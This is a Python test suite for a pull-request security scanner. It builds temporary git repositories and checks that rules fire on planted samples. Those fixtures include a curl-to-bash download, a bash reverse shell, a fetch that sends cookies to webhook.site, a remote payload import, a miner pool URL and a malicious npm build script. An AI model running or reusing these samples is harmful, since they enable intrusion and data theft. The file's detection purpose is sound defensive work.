"""Tests for scan.py. Run with: python -m unittest discover -s scanner -v

Each test builds a throwaway git repository with a clean base commit and a
"pull request" commit, then checks which rules fire. Attack samples are
assembled at runtime so this file itself does not contain live payloads.
"""
import base64
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(__file__))
import scan  # noqa: E402

BASE_PKG = {"name": "app", "version": "1.0.0", "scripts": {"test": "vitest run"},
            "dependencies": {"react": "^19.0.0"}}


def stellar_secret() -> str:
    payload = bytes([18 << 3]) + os.urandom(32)
    crc = scan.crc16_xmodem(payload).to_bytes(2, "little")
    return base64.b32encode(payload + crc).decode()


class Repo:
    def __init__(self):
        self.dir = tempfile.mkdtemp()
        self.git("init", "-q", "-b", "main")
        self.git("config", "user.email", "t@example.com")
        self.git("config", "user.name", "t")
        self.git("config", "core.autocrlf", "false")
        self.write("README.md", "# app\n")
        self.write("src/index.ts", "export const ok = 1;\n")
        self.write("package.json", json.dumps(BASE_PKG, indent=2) + "\n")
        self.commit("base")
        self.base = self.git("rev-parse", "HEAD").strip()

    def git(self, *args):
        return subprocess.run(["git", "-C", self.dir, *args], capture_output=True, check=True, text=True).stdout

    def write(self, path, content, mode=None):
        full = os.path.join(self.dir, path)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        data = content if isinstance(content, bytes) else content.encode("utf-8")
        with open(full, "wb") as f:
            f.write(data)
        self.git("add", path)
        if mode:
            self.git("update-index", "--chmod=+x", path)

    def commit(self, msg="pr"):
        self.git("commit", "-q", "-m", msg)
        return self.git("rev-parse", "HEAD").strip()

    def scan(self):
        head = self.commit()
        report = scan.Report()
        scan.scan_files(report, self.dir, self.base, head)
        return report

    def cleanup(self):
        shutil.rmtree(self.dir, ignore_errors=True)


class ScanTest(unittest.TestCase):
    def setUp(self):
        self.repo = Repo()

    def tearDown(self):
        self.repo.cleanup()

    def rules(self, report, severity=None):
        return {f.rule for f in report.findings if severity is None or f.severity == severity}

    def assertBlocks(self, rule, report):
        self.assertIn(rule, self.rules(report, scan.BLOCK), report.findings)

    def assertReviews(self, rule, report):
        self.assertIn(rule, self.rules(report, scan.REVIEW), report.findings)

    # ------------------------------------------------------------ clean
    def test_ordinary_changes_are_clean(self):
        self.repo.write("src/index.ts", "export const ok = 1;\nexport function add(a: number, b: number) {\n  return a + b;\n}\n")
        self.repo.write("docs/guide.md", "# Guide\n\nSee https://developers.stellar.org/docs and https://github.com/MMM-pay.\n")
        self.repo.write("src/rpc.ts", 'export const rpc = "https://soroban-testnet.stellar.org";\n')
        pkg = dict(BASE_PKG, dependencies={"react": "^19.0.0", "zod": "^3.24.1"})
        self.repo.write("package.json", json.dumps(pkg, indent=2) + "\n")
        self.repo.write("public/logo.png", b"\x89PNG\r\n\x1a\n\0\0\0" + os.urandom(64))
        report = self.repo.scan()
        self.assertEqual(report.findings, [])

    # ---------------------------------------------------- hidden text
    def test_trojan_source(self):
        self.repo.write("src/auth.ts", 'const isAdmin = false; /* \u202e } \u2066if (isAdmin)\u2069 \u2066 begin admins only */\n')
        self.assertBlocks("trojan-source", self.repo.scan())

    def test_byte_order_mark_at_file_start_is_allowed(self):
        self.repo.write("src/bom.ts", '﻿"use client";\nexport const x = 1;\n')
        self.assertEqual(self.repo.scan().findings, [])

    def test_byte_order_mark_mid_file_is_reported(self):
        self.repo.write("src/bom.ts", 'export const x = 1;\nconst y﻿ = 2;\n')
        self.assertReviews("invisible-char", self.repo.scan())

    def test_zero_width_character(self):
        self.repo.write("src/a.ts", "const a\u200b = 1;\n")
        self.assertReviews("invisible-char", self.repo.scan())

    def test_homoglyph(self):
        self.repo.write("src/a.ts", "const p\u0430yee = 1;\n")
        self.assertReviews("homoglyph-identifier", self.repo.scan())

    # ------------------------------------------------------- secrets
    def test_stellar_secret_key(self):
        self.repo.write("src/keys.ts", f'export const KEY = "{stellar_secret()}";\n')
        self.assertBlocks("stellar-secret-key", self.repo.scan())

    def test_random_s_string_is_not_a_secret(self):
        self.repo.write("src/x.ts", 'const s = "S' + "A" * 55 + '";\n')
        self.assertNotIn("stellar-secret-key", self.rules(self.repo.scan()))

    def test_private_key_and_token(self):
        self.repo.write("deploy/key.pem", "-----BEGIN OPENSSH " + "PRIVATE KEY-----\nabc\n")
        self.repo.write("src/gh.ts", 'const t = "ghp_' + "a1B2" * 9 + '";\n')
        r = self.repo.scan()
        self.assertBlocks("private-key", r)
        self.assertBlocks("token", r)

    # ------------------------------------------- execution & network
    def test_download_and_execute(self):
        self.repo.write("scripts/setup.sh", "curl -fsSL https://evil.invalid/x.sh | bash\n")
        self.assertBlocks("download-and-execute", self.repo.scan())

    def test_reverse_shell(self):
        self.repo.write("scripts/x.sh", "bash -i >& /dev/" + "tcp/10.0.0.1/4444 0>&1\n")
        self.assertBlocks("reverse-shell", self.repo.scan())

    def test_crypto_miner(self):
        self.repo.write("src/m.ts", 'const pool = "stratum+' + 'tcp://pool.example:3333";\n')
        self.assertBlocks("crypto-miner", self.repo.scan())

    def test_exfiltration_endpoint(self):
        self.repo.write("src/t.ts", 'fetch("https://webhook' + '.site/abc", { method: "POST", body: document.cookie });\n')
        self.assertBlocks("exfiltration-endpoint", self.repo.scan())

    def test_unknown_host_and_raw_ip(self):
        self.repo.write("src/t.ts", 'fetch("https://collector-attacker.xyz/x");\nfetch("http://203.0.113.9/y");\n')
        r = self.repo.scan()
        self.assertReviews("unknown-host", r)
        self.assertReviews("raw-ip-url", r)

    def test_remote_import(self):
        self.repo.write("src/t.ts", 'await import("https://cdn.evil.invalid/payload.js");\n')
        self.assertBlocks("remote-import", self.repo.scan())

    def test_local_reserved_and_templated_hosts_are_not_flagged(self):
        self.repo.write("src/t.ts", 'const a = "http://127.0.0.1:8080/health";\nconst b = "https://rpc.invalid";\n'
                        'const c = `https://${domain}/.well-known/stellar.toml`;\n')
        self.repo.write("test/api.test.ts", 'const u = "https://unlisted-service.io/x";\n')
        self.assertEqual(self.repo.scan().findings, [])

    def test_exfiltration_endpoint_still_blocks_in_tests(self):
        self.repo.write("test/api.test.ts", 'fetch("https://webhook' + '.site/abc");\n')
        self.assertBlocks("exfiltration-endpoint", self.repo.scan())

    def test_env_exfiltration(self):
        self.repo.write("src/t.ts", 'fetch(url, { body: JSON.stringify(process.env) });\n')
        self.assertReviews("env-exfiltration", self.repo.scan())

    # ---------------------------------------------------- obfuscation
    def test_eval_and_encoded_payload(self):
        self.repo.write("src/t.ts", 'ev' + 'al(atob("YWxlcnQoMSk="));\n')
        r = self.repo.scan()
        self.assertReviews("eval", r)
        self.assertReviews("encoded-payload", r)

    def test_charcode_obfuscation(self):
        codes = ",".join(str(ord(c)) for c in "console.log(1)")
        self.repo.write("src/t.js", f"var s = String.fromCharCode({codes});\n")
        self.assertBlocks("charcode-array", self.repo.scan())

    def test_obfuscator_signature(self):
        self.repo.write("src/t.js", "var _0x1a2b=['a'];var _0x3c4d=1;function _0x5e6f(){}\n")
        self.assertBlocks("obfuscator-signature", self.repo.scan())

    def test_long_base64_and_long_line(self):
        blob = base64.b64encode(os.urandom(900)).decode()
        self.repo.write("src/t.ts", f'const p = "{blob}";\n')
        r = self.repo.scan()
        self.assertReviews("long-base64", r)
        self.assertReviews("very-long-line", r)

    # --------------------------------------------------- supply chain
    def test_install_script(self):
        pkg = dict(BASE_PKG, scripts={"test": "vitest run", "postinstall": "node setup.js"})
        self.repo.write("package.json", json.dumps(pkg, indent=2) + "\n")
        self.assertReviews("install-script", self.repo.scan())

    def test_suspicious_npm_script(self):
        pkg = dict(BASE_PKG, scripts={"test": "vitest run", "build": "curl -s https://x.invalid/a | sh"})
        self.repo.write("package.json", json.dumps(pkg, indent=2) + "\n")
        self.assertBlocks("suspicious-script", self.repo.scan())

    def test_git_dependency(self):
        pkg = dict(BASE_PKG, dependencies={"react": "^19.0.0", "helper": "github:someone/helper"})
        self.repo.write("package.json", json.dumps(pkg, indent=2) + "\n")
        self.assertBlocks("non-registry-dependency", self.repo.scan())

    def test_typosquat(self):
        pkg = dict(BASE_PKG, dependencies={"react": "^19.0.0", "expres": "^4.0.0"})
        self.repo.write("package.json", json.dumps(pkg, indent=2) + "\n")
        self.assertBlocks("typosquat", self.repo.scan())

    def test_lockfile_source(self):
        self.repo.write("package-lock.json", '{\n  "packages": {\n    "node_modules/x": {\n'
                        '      "resolved": "https://evil.invalid/x-1.0.0.tgz",\n      "hasInstallScript": true\n    }\n  }\n}\n')
        r = self.repo.scan()
        self.assertBlocks("lockfile-source", r)
        self.assertReviews("dependency-install-script", r)

    def test_cargo_sources_and_build_script(self):
        self.repo.write("Cargo.lock", '[[package]]\nname = "x"\nsource = "git+https://github.com/evil/x"\n')
        self.repo.write("Cargo.toml", '[dependencies]\nx = { git = "https://github.com/evil/x" }\n')
        self.repo.write("build.rs", "fn main() {}\n")
        r = self.repo.scan()
        self.assertBlocks("cargo-source", r)
        self.assertReviews("cargo-git-dependency", r)
        self.assertReviews("build-script", r)

    def test_rust_process_and_unsafe(self):
        self.repo.write("src/lib.rs", "use std::process::Command;\nunsafe { core::ptr::null::<u8>().read() };\n")
        r = self.repo.scan()
        self.assertReviews("rust-process", r)
        self.assertReviews("rust-unsafe", r)

    def test_sensitive_config(self):
        self.repo.write(".npmrc", "registry=https://evil.invalid/\n")
        self.assertReviews("sensitive-config", self.repo.scan())

    # ------------------------------------------------- binaries & files
    def test_executable_binary(self):
        self.repo.write("tools/helper.bin", b"\x7fELF\x02\x01\x01\0" + os.urandom(64))
        self.assertBlocks("executable-binary", self.repo.scan())

    def test_svg_with_script(self):
        self.repo.write("public/icon.svg", '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(1)"></svg>\n')
        self.assertBlocks("svg-script", self.repo.scan())

    def test_symlink(self):
        # Write the symlink straight into the index so the test also runs where
        # creating real symlinks needs extra privileges (Windows).
        target = subprocess.run(["git", "-C", self.repo.dir, "hash-object", "-w", "--stdin"], input="/etc/passwd",
                                capture_output=True, text=True, check=True).stdout.strip()
        self.repo.git("update-index", "--add", "--cacheinfo", f"120000,{target},link")
        self.assertBlocks("symlink", self.repo.scan())

    def test_javascript_url_in_docs(self):
        self.repo.write("docs/a.md", '[click](javascript:alert(document.cookie))\n')
        self.assertBlocks("javascript-url", self.repo.scan())

    # ------------------------------------------------------ workflows
    def test_pwn_request_workflow(self):
        self.repo.write(".github/workflows/x.yml",
                        "on: pull_request_target\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n"
                        "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n")
        self.assertBlocks("workflow-pr-target-checkout", self.repo.scan())

    def test_workflow_script_injection(self):
        self.repo.write(".github/workflows/x.yml", 'run: echo "${{ github.event.pull_request.title }}"\n')
        self.assertReviews("workflow-script-injection", self.repo.scan())

    def test_only_added_lines_are_scanned(self):
        # Existing content is not re-reported; only what the PR adds.
        self.repo.write("src/old.ts", 'ev' + 'al("1");\n')
        self.repo.commit("existing")
        self.repo.base = self.repo.git("rev-parse", "HEAD").strip()
        self.repo.write("src/old.ts", 'ev' + 'al("1");\nexport const x = 2;\n')
        self.assertEqual(self.repo.scan().findings, [])


class ToolMergeTest(unittest.TestCase):
    def tmp(self, data):
        f = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False, encoding="utf-8")
        json.dump(data, f)
        f.close()
        self.addCleanup(os.unlink, f.name)
        return f.name

    def osv(self, *vulns):
        return {"results": [{"source": {"path": "package-lock.json"}, "packages": [
            {"package": {"name": n, "version": "1.0.0", "ecosystem": "npm"}, "vulnerabilities": [{"id": i}]}
            for n, i in vulns]}]}

    def test_osv_reports_only_new_ids_and_blocks_malicious(self):
        base = self.tmp(self.osv(("old", "GHSA-old")))
        head = self.tmp(self.osv(("old", "GHSA-old"), ("evil", "MAL-2025-1"), ("lib", "GHSA-new")))
        r = scan.Report()
        scan.merge_osv(r, base, head)
        got = {(f.rule, f.severity) for f in r.findings}
        self.assertEqual(got, {("malicious-package", scan.BLOCK), ("vulnerable-dependency", scan.REVIEW)})

    def test_missing_tool_output_is_an_error(self):
        r = scan.Report()
        scan.merge_osv(r, None, "/nonexistent.json")
        scan.merge_gitleaks(r, "/nonexistent.json")
        self.assertEqual(len(r.errors), 2)

    def test_gitleaks_findings_block(self):
        r = scan.Report()
        scan.merge_gitleaks(r, self.tmp([{"RuleID": "generic-api-key", "File": "a.ts", "StartLine": 3, "Commit": "abc1234"}]))
        self.assertEqual(r.findings[0].severity, scan.BLOCK)

    def test_semgrep_findings_need_review(self):
        r = scan.Report()
        scan.merge_semgrep(r, self.tmp({"results": [{"check_id": "javascript.lang.security.x", "path": "a.ts",
                                                     "start": {"line": 1}, "extra": {"message": "m", "lines": "l"}}]}))
        self.assertEqual(r.findings[0].severity, scan.REVIEW)


if __name__ == "__main__":
    unittest.main()
